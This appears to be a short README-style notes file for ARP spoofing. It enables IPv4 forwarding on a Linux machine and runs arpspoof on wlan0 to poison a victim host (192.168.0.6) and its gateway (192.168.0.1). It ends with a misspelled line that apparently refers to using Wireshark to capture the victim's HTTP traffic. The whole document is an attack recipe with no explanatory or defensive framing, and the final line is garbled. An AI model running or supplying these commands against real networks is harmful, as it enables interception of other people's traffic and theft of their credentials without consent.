# arpspoof-100-

echo 1>/proc/sys/net/ipv4/ip_forward

cat /proc/sys/net/ipv4/ip_forward

block=0
unblock=1

arpspoof -i wlan0 -t 192.168.0.6 -r 192.168.0.1

wirsher tool into http hacked
